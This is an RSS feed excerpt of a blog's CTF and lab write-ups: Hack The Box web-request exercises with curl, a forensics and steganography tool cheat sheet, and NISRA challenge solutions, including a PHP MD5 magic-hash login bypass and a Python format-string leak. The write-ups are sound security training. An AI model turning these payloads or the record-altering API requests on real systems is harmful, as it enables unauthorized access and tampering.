&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ curl &amp;#39;http://142.93.47.151:30718/search.php&amp;#39; -b &amp;#39;PHPSESSID=darsv7lbe3aa22nv4v82h039p6&amp;#39; -X POST -d &amp;#39;{&amp;#34;search&amp;#34;:&amp;#34;flag&amp;#34;}&amp;#39; -H &amp;#39;Content-Type: application/json&amp;#39;
[&amp;#34;flag: HTB{p0$t_r3p34t3r}&amp;#34;]%
&lt;/code>&lt;/pre>&lt;h2 id="web-requests-crud">
 &lt;a href="https://academy.hackthebox.com/module/35/section/227">Web Requests-CRUD&lt;/a>
 &lt;a class="anchor" href="#web-requests-crud">#&lt;/a>
&lt;/h2>
&lt;h3 id="background-2">
 Background
 &lt;a class="anchor" href="#background-2">#&lt;/a>
&lt;/h3>
&lt;h3 id="exploit-2">
 Exploit
 &lt;a class="anchor" href="#exploit-2">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># Read all the city
$ curl -s http://165.232.44.246:31084/api.php/city/ \| jq
[{&amp;#34;city_name&amp;#34;:&amp;#34;London&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Birmingham&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Leeds&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Glasgow&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Sheffield&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;}...,{&amp;#34;city_name&amp;#34;:&amp;#34;Baltimore&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(US)&amp;#34;}]%

# Update city Baltimore to flag
$ curl -X PUT http://165.232.44.246:31084/api.php/city/Baltimore -d &amp;#39;{&amp;#34;city_name&amp;#34;:&amp;#34;flag&amp;#34;, &amp;#34;country_name&amp;#34;:&amp;#34;(US)&amp;#34;}&amp;#39; -H &amp;#39;Content-Type: application/json&amp;#39;

# Delete any city
$ curl -X DELETE http://165.232.44.246:31084/api.php/city/Detroit

# Read city named flag to get flag
$ curl -s http://165.232.44.246:32034/api.php/city/ \| jqcurl -s http://165.232.44.246:31084/api.php/city/flag
[{&amp;#34;city_name&amp;#34;:&amp;#34;flag&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;HTB{crud_4p!_m4n!pul4t0r}&amp;#34;}]%
&lt;/code>&lt;/pre>&lt;h2 id="javascript-deobfuscation-decoding">
 &lt;a href="https://academy.hackthebox.com/module/41/section/445">JavaScript Deobfuscation-Decoding&lt;/a>
 &lt;a class="anchor" href="#javascript-deobfuscation-decoding">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit-3">
 Exploit
 &lt;a class="anchor" href="#exploit-3">#&lt;/a>
&lt;/h3>
&lt;p>Use CypherChef First to decode &lt;code>N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz&lt;/code>&lt;/p></description></item><item><title>Misc Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</guid><description>&lt;h1 id="misc-cheat-sheet">
 Misc Cheat Sheet
 &lt;a class="anchor" href="#misc-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Encode &amp;amp; Decode&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://online-barcode-reader.inliteresearch.com/">Free Online Barcode Reader&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Barcode Reader Online&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://emn178.github.io/online-tools/index.html">Encoding&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://roar.iiilab.com/">獸語&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="check-file-info">
 Check file info
 &lt;a class="anchor" href="#check-file-info">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ binwalk [-e] [filename] # or binwalk --dd=&amp;#34;.*&amp;#34; [filename]
$ exiftool [filename]
$ pngcheck [filename]
$ stat [filename]
$ file [filename]
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>$ binwalk -e&lt;/code> 的範例可以參考&lt;a href="https://hackmd.io/@SBK6401/BJgwrxWM6#Electric-Steel">Deadface - Electric Steel &lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>text: &lt;a href="https://github.com/zed-0xff/zsteg">zsteg&lt;/a>(just for &lt;code>bmp&lt;/code> and &lt;code>png&lt;/code> files), &lt;a href="http://quickcrypto.com/download.html">Quick Crypto&lt;/a>&lt;/li>
&lt;li>file: steghide(&lt;code>sudo apt-get install steghide&lt;/code>)(&lt;code>$ steghide extract -sf atbash.jpg&lt;/code>)&lt;/li>
&lt;li>進階的steghide$\to$&lt;a href="https://github.com/RickdeJager/stegseek">stegseek&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install ./stegseek_0.6-1.deb -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stegseek &lt;span style="color:#f92672">[&lt;/span>stegofile.jpg&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>wordlist.txt&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="disk-analysis">
 Disk Analysis
 &lt;a class="anchor" href="#disk-analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">Foremost&lt;/a>: 針對所支援的檔案結構去進行資料搜尋與救援
&lt;code>$ foremost -v {filename}&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://blog.csdn.net/wxh0000mm/article/details/99447206">Sleuth kit/Autopsy&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.exterro.com/ftk-imager">FTK Imager&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/SJOwGrUfa">Logontracer&lt;/a>: Just use GUI to present event log traced on windows
&lt;code>$ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="memory-forensics">
 Memory Forensics
 &lt;a class="anchor" href="#memory-forensics">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>建議直接使用&lt;a href="https://www.volatilityfoundation.org/releases">windown protable version&lt;/a>會比較穩定而且不需要處理環境的問題&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://blog.csdn.net/u011250160/article/details/120461405">Windows Volatility 3 Problems &amp;amp; Solutions&lt;/a>
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/volatilityfoundation/volatility3
$ cd volatility3
$ pip install -r requirement.txt
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility">Volatility 2&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py27 python=2.7
$ conda activate py27
$ git clone https://github.com/volatilityfoundation/volatility
$ cd volatility
$ pip install pycrypto
$ pip install distorm3
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="package">
 Package
 &lt;a class="anchor" href="#package">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://packetlife.net/blog/2008/oct/18/cheat-sheets-tcpdump-and-wireshark/">Wireshark cheat sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86">&lt;code>nmap&lt;/code>&lt;/a>:
&lt;code>$ sudo apt-get install nmap&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=n-ntpdc4-command">&lt;code>ntpdc&lt;/code>&lt;/a>
&lt;code>$ sudo apt-get install ntpdc&lt;/code>&lt;/li>
&lt;li>tcpflow
&lt;code>$ sudo tcpflow -r {pcap file}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="brute-force-password">
 Brute Force Password
 &lt;a class="anchor" href="#brute-force-password">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>for WPA/Wifi based: &lt;a href="https://linuxhint.com/install_aircrack-ng_ubuntu/">&lt;code>aircrack-ng&lt;/code>&lt;/a>, &lt;a href="https://ithelp.ithome.com.tw/articles/10280928">Wifite&lt;/a>&lt;/li>
&lt;li>for system user: &lt;a href="https://ithelp.ithome.com.tw/articles/10300529">John the Ripper&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="sound">
 Sound
 &lt;a class="anchor" href="#sound">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hide files: &lt;a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./decode -X -P pass svega_stego.mp3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sound to image:
&lt;ul>
&lt;li>&lt;a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">How to convert a SSTV audio file to images using QSSTV - en&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.srcmini.com/62326.html">How to convert a SSTV audio file to images using QSSTV - zh-cn&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>hide message: &lt;a href="https://sourceforge.net/projects/silenteye/">silenteye&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="mail">
 Mail
 &lt;a class="anchor" href="#mail">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://goldfynch.com/goldfynch-pst-viewer">PST Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://products.groupdocs.app/zh-hant/viewer/eml">eml Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.thunderbird.net/zh-TW/">ThunderBird Client&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="overall">
 Overall
 &lt;a class="anchor" href="#overall">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://aperisolve.fr/">All stego decrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://tools.miku.ac/">All stego encrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.ctftools.com/">ctf tool&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://w1a2d3s4q5e6.blogspot.com/2016/06/blog-post.html">Other people&amp;rsquo;s note&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
 NISRA - different places
 &lt;a class="anchor" href="#nisra---different-places">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41025/">different places&lt;/a>&lt;/p>
&lt;h2 id="exploit---integrate-fragments-flags">
 Exploit - Integrate Fragments Flags
 &lt;a class="anchor" href="#exploit---integrate-fragments-flags">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>View Page Sources
&lt;img src="https://i.imgur.com/q3tSKo5.png" alt="" />
&lt;img src="https://i.imgur.com/yrKjnyr.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>base64 decode
&lt;code>dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE=&lt;/code> $\to$ &lt;code>username:admin_password:nisra&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Observe the form
It uses get method to fetch the parameters. So we can peek &lt;code>login.php&lt;/code> first.
&lt;img src="https://i.imgur.com/oGFwOoA.png" alt="" />
Then we could use the username and password we got at previous step.
Payload: &lt;code>view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;amp;password=nisra&lt;/code>
Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - Hidden?</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---hidden_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---hidden_/</guid><description>&lt;h1 id="nisra---hidden">
 NISRA - Hidden?
 &lt;a class="anchor" href="#nisra---hidden">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題也是蠻巧妙的，用pngcheck可以看到檔案有問題&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck haha.png
haha.png additional data after IEND chunk
ERROR: haha.png
&lt;/code>&lt;/pre>&lt;h2 id="exploit---recover--unzip">
 Exploit - Recover + Unzip
 &lt;a class="anchor" href="#exploit---recover--unzip">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Recover PNG File
先找文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82）
&lt;img src="https://hackmd.io/_uploads/SySm_6DO3.png" alt="" />
發現後續還有其他bytes，用&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">list signature&lt;/a>追查後面是甚麼，&lt;img src="https://hackmd.io/_uploads/Hy-5OpPOh.png" alt="" />
發現應該是個zip file，所以獨立出來後解壓縮&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Unzip
解壓縮後有一些文件，從裡面撈了一下flag就在./word/document.xml中
Flag: &lt;code>NISRA{Oop5!_yoU_fOuNd_1t}&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkLoDTwO3.png" alt="" />&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
 NISRA - MD5_1
 &lt;a class="anchor" href="#nisra---md5_1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41022/">MD5_1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
 highlight_file(__FILE__);
 $FROM_INCLUDE = true;
 include(&amp;#34;flag.php&amp;#34;);
 $msg = &amp;#34;&amp;#34;;
 if (isset($_GET[&amp;#39;user&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;])) {
 $user = $_GET[&amp;#39;user&amp;#39;];
 $password = $_GET[&amp;#39;password&amp;#39;];
 $check = &amp;#34;QNKCDZO&amp;#34;;
 // the md5 of &amp;#34;QNKCDZO&amp;#34; is 0e830400451993494058024219903391

 if ($user == &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; $password != $check &amp;amp;&amp;amp; md5($password) == md5($check)) {
 $msg = &amp;#34;Flag: &amp;#34;.$flag;
 } else {
 $msg = &amp;#34;Keep trying!&amp;#34;;
 }
 }

 echo $msg;
?&amp;gt; 
&lt;/code>&lt;/pre>&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>http://chall2.nisra.net:41022/?user=admin&amp;amp;password=240610708&lt;/code>
:::spoiler flag
&lt;code>Flag: NISRA{PhP_is_th3_BeST_laNgUA9E}&lt;/code>
:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
 NISRA - MD5_2
 &lt;a class="anchor" href="#nisra---md5_2">#&lt;/a>
&lt;/h1>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>curl http://chall2.nisra.net:41023/ -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -X POST -d &amp;quot;user=240610708&amp;amp;password=QNKCDZO&amp;quot;&lt;/code>
Flag: &lt;code>NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Jack的flag</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/</guid><description>&lt;h1 id="nisra-2023-enlightened---jack的flag">
 NISRA 2023 Enlightened - Jack的flag
 &lt;a class="anchor" href="#nisra-2023-enlightened---jack%e7%9a%84flag">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Microsoft Word Forensics&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這是第一次寫到有關word的隱寫，蠻特別的就紀錄一下，但看得出來應該是考古古古古古古題了ㄅ&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>有兩種方法&lt;/p>
&lt;ol>
&lt;li>強制解壓縮
直接把副檔名改成.zip，然後用解壓縮軟體解壓縮，接著就可以在&lt;code>Final-Jack\word\document.xml&lt;/code>中可以找到flag&lt;/li>
&lt;li>把隱藏設定打開
直接在word中的&lt;code>檔案/選項/顯示/隱藏文字&lt;/code>的方塊打勾，就可以直接在下面看到flag了&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>NISRA{Word'$_h1Dden_7eXT_reVEaLed}&lt;/code>&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Magic Function</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/</guid><description>&lt;h1 id="nisra-2023-enlightened---magic-function">
 NISRA 2023 Enlightened - Magic Function
 &lt;a class="anchor" href="#nisra-2023-enlightened---magic-function">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hacktricks.boitatech.com.br/misc/basic-python/magic-methods">Magic Function of Python&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">class Test():
	def __init__(self, email=&amp;#39;test@nisra.net&amp;#39;):
		self.info = &amp;#39;test&amp;#39;
		self.email = email

class Secret():
	flag = open(&amp;#34;./NISRA-Enlightened-2023/flag.txt&amp;#34;, &amp;#34;r&amp;#34;).read().strip()


if __name__ == &amp;#39;__main__&amp;#39;:
	email = input(&amp;#39;Your email: &amp;#39;)

	if email:
		test = Test(email)
	else:
		test = Test()

	msg = (&amp;#39;this is for {test.info}, please contact &amp;#39; + email + &amp;#39;.&amp;#39;).format(test=test)

	print(msg)
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題真的很有趣，但也是算通靈的奇淫怪招，仔細看了一下直覺應該是跟format string有關係，比賽的時候的確有想到，但我當時想的payload有點偏掉了，當時的payload是: &lt;code>{test.email}.format(test=Test(Secret().flag))&lt;/code>，也就是先傳入Secret().flag給Test這個class，然後再利用format傳入給&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Pixel</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---pixel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---pixel/</guid><description>&lt;h1 id="nisra-2023-enlightened---pixel">
 NISRA 2023 Enlightened - Pixel
 &lt;a class="anchor" href="#nisra-2023-enlightened---pixel">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/HkF8f_702.png" alt="" />&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題真的很難，應該說有想過，不過很麻煩就是了，每一個色塊都有一組RGB的數值，然後只要把它轉換成ASCII，再把每一個字元串起來，就會是一組base64的code，轉換之後就拿到一組ciphertext，接著就丟到cyberchef看看一般的工具可不可以解，最後是用rot13解出來，除了最一開始的地方需要一點通靈之外，其他都很簡單，但&amp;hellip;寫script頗麻煩&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> PIL &lt;span style="color:#f92672">import&lt;/span> Image
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64decode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>img &lt;span style="color:#f92672">=&lt;/span> Image&lt;span style="color:#f92672">.&lt;/span>open(&lt;span style="color:#e6db74">&amp;#34;./NISRA-Enlightened-2023/Misc/Final-Pixel.png&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pixels &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> row &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):	&lt;span style="color:#75715e"># 8 rows&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> col &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):	&lt;span style="color:#75715e"># 8 columns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		r, g, b &lt;span style="color:#f92672">=&lt;/span> img&lt;span style="color:#f92672">.&lt;/span>getpixel((row &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, col &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>))	&lt;span style="color:#75715e"># each grid: 64 x 64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> r &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> g &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> b &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			pixels&lt;span style="color:#f92672">.&lt;/span>append((chr(r), chr(g), chr(b)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> r &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> g &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> b &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(pixels)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> r, g, b &lt;span style="color:#f92672">in&lt;/span> pixels:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	flag &lt;span style="color:#f92672">+=&lt;/span> r &lt;span style="color:#f92672">+&lt;/span> g &lt;span style="color:#f92672">+&lt;/span> b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(b64decode(flag&lt;span style="color:#f92672">.&lt;/span>encode()))
